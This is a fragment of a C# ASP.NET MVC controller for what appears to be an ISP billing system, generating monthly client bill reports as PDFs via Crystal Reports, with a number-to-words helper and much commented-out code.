        //    //                                   PackageName = valTra.Transaction.Package.PackageName,
        //    //                                   BillMonthName = "Date...",
        //    //                                   PackageAmount = valTra.Transaction.Package.PackagePrice,
        //    //                                   DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valClientDueBill.DueAmount) : "0",
        //    //                                   AmountInWords = (valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
        //    //                                   PaymentYear = valTra.Transaction.PaymentYear,
        //    //                                   PaymentMonth = valTra.Transaction.PaymentMonth,
        //    //                                   PaymentStatus = valTra.Transaction.PaymentStatus
        //    //                               }//{ Transaction = valTra.Transaction, ClientDueBills = valClientDueBill }
        //    //                            )

        //    //   .Where(s => s.PaymentYear == AppUtils.RunningYear && s.PaymentMonth == AppUtils.RunningMonth).ToList();//.GroupBy(s => s.PaymentStatus, (key, g) => g.OrderBy(s => s.PaymentStatus)).Select(s => s.ToList())


        //    ReportDocument rd = new ReportDocument();
        //    rd.Load(Path.Combine(Server.MapPath("~/CrystalReport1.rpt")));

        //    rd.SetDataSource(sss);

        //    Response.Buffer = false;
        //    Response.ClearContent();
        //    Response.ClearHeaders();


        //    Stream stream = rd.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);
        //    stream.Seek(0, SeekOrigin.Begin);

        //    //******************************** for downloading directly ********************************************
        //    //return File(stream, MediaTypeNames.Text.Plain, "CustomerList_"+AppUtils.GetDateTimeNow()+".pdf");
        //    //******************************************************************************************************

        //    //******************************* for showing in browser **************************************
        //    Response.AddHeader("Content-Disposition", "inline; filename='CustomerList_" + AppUtils.GetDateTimeNow() + ".pdf'");
        //    return File(stream, "application/pdf");
        //    //***********************************************************************************************************

        //}

        // GET: ReportC:\Users\Unknown\Desktop\isp\V1_with_Validation\Project_ISP\Project_ISP\Project_ISP\BillReport.rpt

        [SessionTimeout][AjaxAuthorizeAttribute]
        public ActionResult ShoBillReport(int? ForAllOrSingle, int? TransactionID)
        {

            var r = 1.ToWords();

            string ss = NumberToText(2000101, false);

            IEnumerable<dynamic> lstArchiveBills = new List<dynamic>();

            if (ForAllOrSingle != null && ForAllOrSingle.Value == AppUtils.ReportShowForAll)
            {
                lstArchiveBills = db.Transaction.GroupJoin(
                                                        db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
                                                        (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
                                  .Select(valTra => new
                                  {
                                      Transaction = valTra.Transaction,
                                      ClientDueBillsList = valTra.ClientDueBills
                                  })
                                  .Where(s => s.Transaction.PaymentYear == AppUtils.RunningYear && s.Transaction.PaymentMonth == AppUtils.RunningMonth).Select(s => new
                                  {
                                      Transaction = s.Transaction,
                                      BillMonthName = s.Transaction.PaymentYear + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentMonth).FirstOrDefault().MonthName,
                                      DueBills = (s.ClientDueBillsList.Any()) ? s.ClientDueBillsList.Sum(sa => sa.DueAmount).ToString() : "0",
                                  })
                                  .AsQueryable().AsEnumerable();
            }
            else {
                lstArchiveBills = db.Transaction.Where(s=>s.TransactionID == TransactionID.Value).GroupJoin(db.ClientDueBills,transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
                    (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
                    .Select(s => new
                    {
                        Transaction = s.Transaction,
                        BillMonthName = s.Transaction.PaymentYear + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentMonth).FirstOrDefault().MonthName,
                        DueBills = (s.ClientDueBills.Any()) ? s.ClientDueBills.Sum(sa => sa.DueAmount).ToString() : "0",
                    }).AsQueryable().AsEnumerable();
            }



            var sss = lstArchiveBills.Select(valTra =>
            new
            {
                PaymentStatus = (valTra.Transaction.PaymentStatus == AppUtils.PaymentIsPaid)?"PAID":"Not Paid",
                CompanyName = "WalletMix",
                CompanyAddress = "Khilkhet, nikunja2, dhaka",
                ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
                Adress = valTra.Transaction.ClientDetails.Address,
                ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
                ResetNo = valTra.Transaction.ResetNo == null ? "" : valTra.Transaction.ResetNo,
                IssueDate = valTra.Transaction.PaymentDate == null ? "" : valTra.Transaction.PaymentDate.ToString(),
                ClientName = valTra.Transaction.ClientDetails.Name,
                LoginName = valTra.Transaction.ClientDetails.LoginName,
                PackageName = valTra.Transaction.Package.PackageName,
                BillMonthName = valTra.BillMonthName,
                PackageAmount = valTra.Transaction.PaymentAmount,/*valTra.Transaction.Package.PackagePrice,*/
                DueBill = valTra.DueBills,
                //  DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valvalClientDueBill.DueAmount) : "0",
                AmountInWords = ((int)valTra.Transaction.PaymentAmount).ToWords() + " Taka Only.",//(valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
                PaymentYear = valTra.Transaction.PaymentYear,
                PaymentMonth = valTra.Transaction.PaymentMonth,
                //PaymentStatus = valTra.Transaction.PaymentStatus
            }).ToList();

            //.SelectMany(
            //                               variable => variable.ClientDueBills.DefaultIfEmpty(),
            //                               (valTra, valClientDueBill) => new
            //                               {
            //                                   ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
            //                                   Adress = valTra.Transaction.ClientDetails.Address,
            //                                   ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
            //                                   ResetNo = valTra.Transaction.ResetNo,
            //                                   IssueDate = valTra.Transaction.PaymentDate.ToString(),
            //                                   ClientName = valTra.Transaction.ClientDetails.Name,
            //                                   LoginName = valTra.Transaction.ClientDetails.LoginName,
            //                                   PackageName = valTra.Transaction.Package.PackageName,
            //                                   BillMonthName = "Date...",
            //                                   PackageAmount = valTra.Transaction.Package.PackagePrice,
            //                                   DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valClientDueBill.DueAmount) : "0",
            //                                   AmountInWords = (valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
            //                                   PaymentYear = valTra.Transaction.PaymentYear,
            //                                   PaymentMonth = valTra.Transaction.PaymentMonth,
            //                                   PaymentStatus = valTra.Transaction.PaymentStatus
            //                               }//{ Transaction = valTra.Transaction, ClientDueBills = valClientDueBill }
            //                            )

            //   .Where(s => s.PaymentYear == AppUtils.RunningYear && s.PaymentMonth == AppUtils.RunningMonth).ToList();//.GroupBy(s => s.PaymentStatus, (key, g) => g.OrderBy(s => s.PaymentStatus)).Select(s => s.ToList())


            ReportDocument rd = new ReportDocument();
            rd.Load(Path.Combine(Server.MapPath("~/CrystalReport1.rpt")));

            rd.SetDataSource(sss);

            Response.Buffer = false;
            Response.ClearContent();
            Response.ClearHeaders();


            Stream stream = rd.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);
            stream.Seek(0, SeekOrigin.Begin);

            //******************************** for downloading directly ********************************************
            //return File(stream, MediaTypeNames.Text.Plain, "CustomerList_"+AppUtils.GetDateTimeNow()+".pdf");
            //******************************************************************************************************

            //******************************* for showing in browser **************************************
            Response.AddHeader("Content-Disposition", "inline; filename='CustomerList_" + AppUtils.GetDateTimeNow() + ".pdf'");
            return File(stream, "application/pdf");
            //***********************************************************************************************************

        }

        private object functions(ClientDueBills clientDueBills)
        {
            return clientDueBills.DueAmount.ToString();
        }

        private object functions()
        {
            return "HI";
        }

        public string NumberToText(int number, bool isUK)
        {
            if (number == 0) return "Zero";
            string and = isUK ? "and " : ""; // deals with UK or US numbering
            if (number == -2147483648) return "Minus Two Billion One Hundred " + and +
            "Forty Seven Million Four Hundred " + and + "Eighty Three Thousand " +
            "Six Hundred " + and + "Forty Eight";
            int[] num = new int[4];
            int first = 0;
            int u, h, t;
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            if (number < 0)
            {
                sb.Append("Minus ");
                number = -number;
            }
            string[] words0 = { "", "One ", "Two ", "Three ", "Four ", "Five ", "Six ", "Seven ", "Eight ", "Nine " };
            string[] words1 = { "Ten ", "Eleven ", "Twelve ", "Thirteen ", "Fourteen ", "Fifteen ", "Sixteen ", "Seventeen ", "Eighteen ", "Nineteen " };
            string[] words2 = { "Twenty ", "Thirty ", "Forty ", "Fifty ", "Sixty ", "Seventy ", "Eighty ", "Ninety " };
            string[] words3 = { "Thousand ", "Million ", "Billion " };
            num[0] = number % 1000;           // units
            num[1] = number / 1000;
            num[2] = number / 1000000;
            num[1] = num[1] - 1000 * num[2];  // thousands
            num[3] = number / 1000000000;     // billions
            num[2] = num[2] - 1000 * num[3];  // millions
            for (int i = 3; i > 0; i--)
            {
                if (num[i] != 0)
                {
                    first = i;
                    break;
                }
            }
            for (int i = first; i >= 0; i--)
            {
                if (num[i] == 0) continue;
                u = num[i] % 10;              // ones
                t = num[i] / 10;
                h = num[i] / 100;             // hundreds
                t = t - 10 * h;               // tens
                if (h > 0) sb.Append(words0[h] + "Hundred ");
                if (u > 0 || t > 0)
                {
                    if (h > 0 || i < first) sb.Append(and);
                    if (t == 0)
                        sb.Append(words0[u]);
                    else if (t == 1)
                        sb.Append(words1[u]);
                    else
                        sb.Append(words2[t - 2] + words0[u]);
                }
                if (i != 0) sb.Append(words3[i - 1]);
            }
            return sb.ToString().TrimEnd();
        }
    }
}